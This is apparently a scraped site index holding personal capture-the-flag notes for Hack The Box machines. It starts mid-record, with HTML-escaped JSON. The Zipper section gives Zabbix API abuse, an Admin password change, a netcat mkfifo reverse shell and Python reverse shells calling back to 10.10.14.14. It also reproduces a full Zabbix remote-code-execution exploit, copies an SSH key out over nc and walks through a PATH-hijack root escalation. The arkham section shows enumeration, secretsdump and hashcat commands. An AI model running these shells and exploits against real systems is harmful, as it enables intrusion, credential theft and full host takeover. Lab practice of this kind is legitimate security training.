traceroute\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.execute\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;hostid\u0026quot;: \u0026quot;10106\u0026quot;}, \u0026quot;auth\u0026quot;: \u0026quot;f75aed6a9bf98e7b3057e61e13680eb1\u0026quot; , \u0026quot;id\u0026quot;: 3}  Update user\nhttps://www.zabbix.com/documentation/3.0/manual/api/reference/user/update\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.update\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;userid\u0026quot;:\u0026quot;1\u0026quot;, \u0026quot;passwd\u0026quot;:\u0026quot;chickenpwny\u0026quot;} ,\u0026quot;auth\u0026quot;:\u0026quot;b6acd672e89dcc9df687144c641f2102\u0026quot;, \u0026quot;id\u0026quot;: 1  https://www.zabbix.com/documentation/3.0/manual/api/reference/user/updateprofile\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.updateprofile\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;gui_access\u0026quot; : \u0026quot;0\u0026quot;} ,\u0026quot;auth\u0026quot;:\u0026quot;965527f25c3ccfb94a0aac0045a08ae1\u0026quot;, \u0026quot;id\u0026quot;: 1}  Managed to change Zapper alias to chicken\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.updateprofile\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;alias\u0026quot;:\u0026quot;chicken\u0026quot;} ,\u0026quot;auth\u0026quot;:\u0026quot;fe104ec22e55d13c8e86cb66c93dc6f6\u0026quot;, \u0026quot;id\u0026quot;: 1}  Changing Admin password, changed it to chickenpwny lol. See the abose to see how i got the information to confirm this part.\nGetScripts\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.getscriptsbyhosts\u0026quot;, \u0026quot;params\u0026quot;: [10106], \u0026quot;auth\u0026quot; : \u0026quot;a13a74e204be089da0a4bff711cad266\u0026quot;, \u0026quot;id\u0026quot;:1}  {\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.get\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;output\u0026quot;:\u0026quot;extend\u0026quot;}, \u0026quot;auth\u0026quot; : \u0026quot;2cd9441052c1eab4d63885c825766154\u0026quot;, \u0026quot;id\u0026quot;:1}  {\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;result\u0026quot;:[{\u0026quot;scriptid\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Ping\u0026quot;,\u0026quot;command\u0026quot;:\u0026quot;ls\u0026quot;,\u0026quot;host_access\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;usrgrpid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;groupid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;description\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;confirmation\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;execute_on\u0026quot;:\u0026quot;2\u0026quot;}, {\u0026quot;scriptid\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;meow\u0026quot;,\u0026quot;command\u0026quot;:\u0026quot;rm \\/tmp\\/f;mkfifo \\/tmp\\/f;cat \\/tmp\\/f|\\/bin\\/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 9017 \u0026gt;\\/tmp\\/f\u0026quot;,\u0026quot;host_access\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;usrgrpid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;groupid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;description\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;confirmation\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;execute_on\u0026quot;:\u0026quot;1\u0026quot;}, {\u0026quot;scriptid\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Detect operating system\u0026quot;,\u0026quot;command\u0026quot;:\u0026quot;sudo \\/usr\\/bin\\/nmap -O {HOST.CONN} 2\u0026gt;\u0026amp;1\u0026quot;,\u0026quot;host_access\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;usrgrpid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;groupid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;description\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;confirmation\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;execute_on\u0026quot;:\u0026quot;1\u0026quot;}],\u0026quot;id\u0026quot;:1}  USERGROUP https://www.zabbix.com/documentation/3.0/manual/api/reference/usergroup\nUSERGROUP.GET {\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;usergroup.get\u0026quot;, \u0026quot;params\u0026quot;: {}, \u0026quot;auth\u0026quot;:\u0026quot;76ae2a3721c502c6bbf18b51185b6e37\u0026quot;,\u0026quot;id\u0026quot;: 3}  {\u0026quot;usrgrpid\u0026quot;:\u0026quot;7\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Zabbix administrators\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;0\u0026quot;},{\u0026quot;usrgrpid\u0026quot;:\u0026quot;8\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Guests\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;0\u0026quot;},{\u0026quot;usrgrpid\u0026quot;:\u0026quot;9\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Disabled\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;0\u0026quot;},{\u0026quot;usrgrpid\u0026quot;:\u0026quot;11\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Enabled debug mode\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;1\u0026quot;},{\u0026quot;usrgrpid\u0026quot;:\u0026quot;12\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;No access to the frontend\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;0\u0026quot;}  USERGROUP.UPDATE\ntry updaing the usrgrpid 12 to gui access\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;usergroup.update\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;usrgrpid\u0026quot;:\u0026quot;12\u0026quot;, \u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;}, \u0026quot;auth\u0026quot;:\u0026quot;76ae2a3721c502c6bbf18b51185b6e37\u0026quot;,\u0026quot;id\u0026quot;: 1}  the multiple cookies are from me messing with the cookies using an addon lol\nINTERFACE.get\nTo get information about the interface icluding the hostid.\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;hostinterface.get\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;interaceids\u0026quot;:\u0026quot;\u0026quot;}, \u0026quot;auth\u0026quot;:\u0026quot;76ae2a3721c502c6bbf18b51185b6e37\u0026quot;,\u0026quot;id\u0026quot;: 3}  {\u0026quot;interfaceid\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;hostid\u0026quot;:\u0026quot;10105\u0026quot;,\u0026quot;main\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;useip\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;ip\u0026quot;:\u0026quot;127.0.0.1\u0026quot;,\u0026quot;dns\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;port\u0026quot;:\u0026quot;10050\u0026quot;,\u0026quot;bulk\u0026quot;:\u0026quot;1\u0026quot;}, {\u0026quot;interfaceid\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;hostid\u0026quot;:\u0026quot;10106\u0026quot;,\u0026quot;main\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;useip\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;ip\u0026quot;:\u0026quot;172.17.0.1\u0026quot;,\u0026quot;dns\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;port\u0026quot;:\u0026quot;10050\u0026quot;,\u0026quot;bulk\u0026quot;:\u0026quot;1\u0026quot;}  You can also get a shell using the webportal. change execute on to zabbix server.\nPYTHON\nneed to use the full path /usr/bin/python3\n/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.14\u0026quot;,9038));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'  Upgrading the TTY\n/usr/bin/python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'  yeah finally on the right host\n#!/bin/bash # # Quick script to backup all utilities in this folder to /backups # /usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* \u0026amp;\u0026gt;/dev/null echo $?$  $? is the return code from the last run process. 0 means no error happened. Other values represent some kind of unusual condition. The password has a special character in that can\u0026rsquo;t be coppied over. so cat the file can copy the passowrd and su into the user.\n-p set password ZippityDodah -a add file to archive  REVIEWING 39937.PY\nSo, after some learning I went back and edited the binary to execute on the zabbix server instead of the agent landing me on the correct host. changed the hostid to 10106.\n#!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = 'http://10.10.10.108' ### Zabbix IP-address url = ZABIX_ROOT + '/zabbix/api_jsonrpc.php' ### Don't edit login = 'Zapper' ### Zabbix login password = 'zapper' ### Zabbix password hostid = '10106' ### Zabbix hostid ### auth payload = { \u0026quot;jsonrpc\u0026quot; : \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot; : \u0026quot;user.login\u0026quot;, \u0026quot;params\u0026quot;: { 'user': \u0026quot;\u0026quot;+login+\u0026quot;\u0026quot;, 'password': \u0026quot;\u0026quot;+password+\u0026quot;\u0026quot;, }, \u0026quot;auth\u0026quot; : None, \u0026quot;id\u0026quot; : 0, } headers = { 'content-type': 'application/json', } auth = requests.post(url, data=json.dumps(payload), headers=(headers)) auth = auth.json() while True: cmd = raw_input('\\033[41m[zabbix_cmd]\u0026gt;\u0026gt;: \\033[0m ') if cmd == \u0026quot;\u0026quot; : print \u0026quot;Result of last command:\u0026quot; if cmd == \u0026quot;quit\u0026quot; : break ### update payload = { \u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.update\u0026quot;, \u0026quot;params\u0026quot;: { \u0026quot;host_access\u0026quot;:\u0026quot;1\u0026quot;, #### \u0026quot;groupid\u0026quot;:\u0026quot;0\u0026quot;,\t##### \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;,\t###### \u0026quot;type\u0026quot;: \u0026quot;0\u0026quot;,\t##### \u0026quot;execute_on\u0026quot;:\u0026quot;1\u0026quot;,\t#####@######################### \u0026quot;command\u0026quot;: \u0026quot;\u0026quot;+cmd+\u0026quot;\u0026quot; }, \u0026quot;auth\u0026quot; : auth['result'], \u0026quot;id\u0026quot; : 0, } cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers)) ### execute payload = { \u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.execute\u0026quot;, \u0026quot;params\u0026quot;: { \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;hostid\u0026quot;: \u0026quot;\u0026quot;+hostid+\u0026quot;\u0026quot; }, \u0026quot;auth\u0026quot; : auth['result'], \u0026quot;id\u0026quot; : 0, } cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers)) cmd_exe = cmd_exe.json() print cmd_exe[\u0026quot;result\u0026quot;][\u0026quot;value\u0026quot;]  So i tried logging back and could not do it for the lfie of me. This will be more detailed to avoid missing anything steps.\nYou may create a script or update a script. First login using the api get the sessionid and use that for authentication. Use hostinterface.get and review the host :10105, :10106. Next change the Admin password to WatchIppsec. Go to scripts and edit detect operating system to reflect below.\nYou may also change zappers privledges but this is much simpler. should be above somewhere.\nPYTHON3\nIf you dont use python3 the shell will be closed after the first command is entered or in five seconds. you can navigate the directories and it doesn\u0026rsquo;t hinder anything. It got annoying and i needed to get a real shell to use su to escalate to zapper. May need to run two nc listeners and chain the shells to get a stable connection.\n /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.14\u0026quot;,9017));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'  PYTHON PTY\n/usr/bin/python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash/\u0026quot;)'  SU ZAPPER COPY PASTE THE PASSWORD FROM THE FILE IT HAS A SPECIAL CHARACTER\nROOT you can copy over id_rsa and login as zapper with a ssh_key. I used nc to trans over the files\nnc -lp 9018 \u0026gt; id_rsa nc -w 3 10.10.14.14 9018 \u0026lt; id_rsa chmod 600 id_rsa ssh zapper@10.10.10.108 -i id_rsa  This method is on the oscp. Seems pretty common when it comes to linux privledge escalation. I have never bumped into it. Most programs will uses the closest exeternal references. If the external call for say a library module or some kind of system command; it will uses the closest one. lets say the script is using cat to read the output of a file. The binary uses cat but if if a malicious cat binary was placed in the local directory it will use that one before /bin/cat. this is a built in thing with some programing languages like python suffer from libary hijacking.\nusing strings or ltrace youll notice the program uses the system command systemctl. Thats what well being takin advantage of to get root.\nLTRACE cd /home/zapper/utils echo \u0026quot;/bin/bash\u0026quot; \u0026gt; systemctl chmod 777 systemctl echo $PATH export PATH=/home/zapper/utils:$PATH ./zabbix-service  clean up the path changes be careful chaning this\nPATH=$(echo \u0026quot;$PATH\u0026quot; | sed -e 's/:\\/home\\/zapper\\/utils$//')  SOURCE CODE FOR ZABBIX SERVICES\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; const char *opt = NULL; //compile: gcc -o zabbix-service zabbix-service.c //copy: cp zabbix-service /home/zapper/utils/zabbix-service //suid: chmod a+s /home/zapper/utils/zabbix-service int main(int argc, const char **argv) { setuid(0); setgid(0); if (argc == 1) { // no argument was passed in, get input char input[10]; printf( \u0026quot;start or stop?: \u0026quot; ); fgets(input, sizeof(input), stdin); input[strcspn(input, \u0026quot;\\n\u0026quot;)] = 0; opt = input; } else { opt = argv[1]; } if (strcmp(opt, \u0026quot;start\u0026quot;) == 0) { ########################################################## never mind it does not use full paths lol ######################################################## system(\u0026quot;systemctl daemon-reload \u0026amp;\u0026amp; systemctl start zabbix-agent\u0026quot;); } else if (strcmp(opt, \u0026quot;stop\u0026quot;) == 0) { system(\u0026quot;systemctl stop zabbix-agent\u0026quot;); } else { printf(\u0026quot;[!] ERROR: Unrecognized Option\\n\u0026quot;); return 1; } return 0; }  "
},
{
	"uri": "/hackthebox/boxes/arkham/notes/",
	"title": "arkham notes",
	"tags": [],
	"description": "",
	"content": " nmaptcp-connect\nnmap -oA nmap/tcp-connect 10.10.10.130 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 12:31 EDT Nmap scan report for 10.10.10.130 Host is up (0.044s latency). Not shown: 995 filtered ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8080/tcp open http  targeted-scan\nnmap -sC -sV -p80,135,139,445,8080 -oA nmap/targeted-scan-sweep 10.10.10.130 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 12:32 EDT Nmap scan report for 10.10.10.130 Host is up (0.045s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 8080/tcp open http Apache Tomcat 8.5.37 | http-methods: |_ Potentially risky methods: PUT DELETE |_http-title: Mask Inc. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 25s, deviation: 0s, median: 25s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-03-25 12:33:24 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  nmap smb scan\nnmap --script smb-enum-shares.nse -p445 -oA nmap/smb-scan 10.10.10.130  Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 12:44 EDT Nmap scan report for 10.10.10.130 Host is up (0.042s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 3.81 seconds  udp\ndig didn\u0026rsquo;t turn anything either\ndig arkham.htb ANT @10.10.10.130  scanning the initial 1000 ports didn\u0026rsquo;t yield anything which is highly suspicious\nsmb enumeration\nsmb looks promising.\nwsmbmap -u guest -H 10.10.10.130 -r [+] Finding open SMB ports.... [+] User SMB session establishd on 10.10.10.130... [+] IP: 10.10.10.130:445 Name: 10.10.10.130 Disk Permissions ---- ----------- ADMIN$ NO ACCESS BatShare READ ONLY ./ dr--r--r-- 0 Sun Feb 3 08:04:13 2019 . dr--r--r-- 0 Sun Feb 3 08:04:13 2019 .. fr--r--r-- 4046695 Sun Feb 3 08:04:13 2019 appserver.zip C$ NO ACCESS IPC$ READ ONLY ./ fr--r--r-- 3 Sun Dec 31 19:03:58 1600 InitShutdown fr--r--r-- 4 Sun Dec 31 19:03:58 1600 lsass fr--r--r-- 3 Sun Dec 31 19:03:58 1600 ntsvcs fr--r--r-- 3 Sun Dec 31 19:03:58 1600 scerpc fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-378-0 fr--r--r-- 3 Sun Dec 31 19:03:58 1600 epmapper fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-1e0-0 fr--r--r-- 3 Sun Dec 31 19:03:58 1600 LSM_API_service fr--r--r-- 3 Sun Dec 31 19:03:58 1600 eventlog fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-190-0 fr--r--r-- 3 Sun Dec 31 19:03:58 1600 atsvc fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-3f4-0 fr--r--r-- 4 Sun Dec 31 19:03:58 1600 wkssvc fr--r--r-- 3 Sun Dec 31 19:03:58 1600 spoolss fr--r--r-- 3 Sun Dec 31 19:03:58 1600 trkwks fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-2a8-0 fr--r--r-- 3 Sun Dec 31 19:03:58 1600 W32TIME_ALT fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-274-0 fr--r--r-- 1 Sun Dec 31 19:03:58 1600 Winsock2\\CatalogChangeListener-288-0 fr--r--r-- 4 Sun Dec 31 19:03:58 1600 srvsvc fr--r--r-- 1 Sun Dec 31 19:03:58 1600 vgauth-service fr--r--r-- 3 Sun Dec 31 19:03:58 1600 ROUTER fr--r--r-- 1 Sun Dec 31 19:03:58 1600 PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER Users READ ONLY ./ dw--w--w-- 0 Sun Feb 3 08:24:10 2019 . dw--w--w-- 0 Sun Feb 3 08:24:10 2019 .. dw--w--w-- 0 Thu Jan 31 21:49:06 2019 Default fr--r--r-- 174 Fri Feb 1 11:10:07 2019 desktop.ini dr--r--r-- 0 Sun Feb 3 08:24:19 2019 Guest  BatManShare\nbatman left a note to Alfred.\nAlfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce  Everything else looks boring, but well check for writeable drives like in sizzle. by mounting the drives and checking the differences when we try and write to the share. So this is a new note when running this little script and it stops thats most likely a writeable drive. In sizzle there were more directories so it wasn\u0026rsquo;t as obivious.\nGuest share is writeable this could be exploited. if psexec.py would detect the share being writeable shme problem with sizzle.\nfor folder in /mnt/arkham/Guest/**/*; do touch \u0026quot;$folder\u0026quot;; done  Now on to the impacket enumeration\nXD need a password hmm[\nGetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/Administrator  Enum4linux failed just ran it with the -a switch\nenum4linux -a 10.10.10.130  Also ran secretsdump running batman, alfred guest as users to login as with no-pass\nsecretsdump.py -just-dc Administrator/guest\\@10.10.10.130 -no-pass  So I walked away with a backup image of a server, Two user names Bruce \u0026amp; Alfred. What ill need to further some of the things tested domain names \u0026amp; passwords.\nwebapp enumerations\nCheck for sub-domains, enumerate directories, check port 8080, change local dns, \u0026amp; the initial webpage is the default iss webpages. i might be uploading some exploits and using a some kind of exploitable webpage to gain access. Initial Smb enumeration didn\u0026rsquo;t show anything, further investigation will ensue.\nI ran wfuzz it wasn\u0026rsquo;t producing any output check my local dns everything is fine. I believe there may not be any dns for this box because when i just change it to arkham.htb it just hangs. nmap seems to show that there may not be a dns because my udp scan came up empty.\nwfuzz -c -f sub-arkham -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;http://arkham.htb:8080\u0026quot; -H \u0026quot;Host: FUZZ.arkham.htb\u0026quot; -t 42 --hc 200  gobuster going to use iis.txt\nGobuster just produces a bunch of 302 errors. Some kind of waf in place.\ngobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.130:8080/ -t 4 0 -x aspx,php,asp,net -o gobuster/first.go  \u0026lt;pre\u0026gt;/images (Status: 302) /css (Status: 302) /js (Status: 302) /fonts (Status: 302) \u0026lt;/pre\u0026gt;  HASHCAT\nIt\u0026rsquo;s been awhile still hasn\u0026rsquo;t found the password might be something not in rockyou.\nhashcat -m 14600 -a 0 -w 3 hashes\\backup.img rockyou.txt -o found  batmanforever  Examining Backup.img\nit has a the screen play for batmanforever, some pictures of batmans stuff. Some Server Files all of them are pretty meaningless but the .bak file folds some more details about how the web app works. it says the word secret so i dont know quite yet.\nrunning file on the backup.img reveals that it is a luks encrypted file.\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt; \u0026lt;web-app xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot; xmlns=\u0026quot;http://java.sun.com/xml/ns/javaee\u0026quot; xmlns:web=\u0026quot;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\u0026quot; xsi:schemaLocation=\u0026quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\u0026quot; id=\u0026quot;WebApp_ID\u0026quot; version=\u0026quot;2.5\u0026quot;\u0026gt; \u0026lt;display-name\u0026gt;HelloWorldJSF\u0026lt;/display-name\u0026gt; \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;index.html\u0026lt;/welcome-file\u0026gt; \u0026lt;welcome-file\u0026gt;index.htm\u0026lt;/welcome-file\u0026gt; \u0026lt;welcome-file\u0026gt;default.html\u0026lt;/welcome-file\u0026gt; \u0026lt;welcome-file\u0026gt;default.htm\u0026lt;/welcome-file\u0026gt; \u0026lt;welcome-file\u0026gt;default.jsp\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;Faces Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;javax.faces.webapp.FacesServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;Faces Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.faces\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;javax.servlet.jsp.jstl.fmt.localizationContext\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;resources.application\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;description\u0026gt;State saving method: 'client' or 'server' (=default). See JSF Specification 2.5.2\u0026lt;/description\u0026gt; \u0026lt;param-name\u0026gt;javax.faces.STATE_SAVING_METHOD\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;server\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_ALGORITHM\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;HmacSHA1\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;description\u0026gt; This parameter tells MyFaces if javascript code should be allowed in the rendered HTML output. If javascript is allowed, command_link anchors will have javascript code that submits the corresponding form. If javascript is not allowed, the state saving info and nested parameters will be added as url parameters. Default is 'true'\u0026lt;/description\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.ALLOW_JAVASCRIPT\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;description\u0026gt; If true, rendered HTML code will be formatted, so that it is 'human-readable' i.e. additional line separators and whitespace will be written, that do not influence the HTML code. Default is 'true'\u0026lt;/description\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.PRETTY_HTML\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.DETECT_JAVASCRIPT\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;description\u0026gt; If true, a javascript function will be rendered that is able to restore the former vertical scroll on every request. Convenient feature if you have pages with long lists and you do not want the browser page to always jump to the top if you trigger a link or button action that stays on the same page. Default is 'false' \u0026lt;/description\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.AUTO_SCROLL\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;com.sun.faces.numberOfViewsInSession\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;500\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;com.sun.faces.numberOfLogicalViews\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;500\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;listener-class\u0026gt;org.apache.myfaces.webapp.StartupServletContextListener\u0026lt;/listener-class\u0026gt; 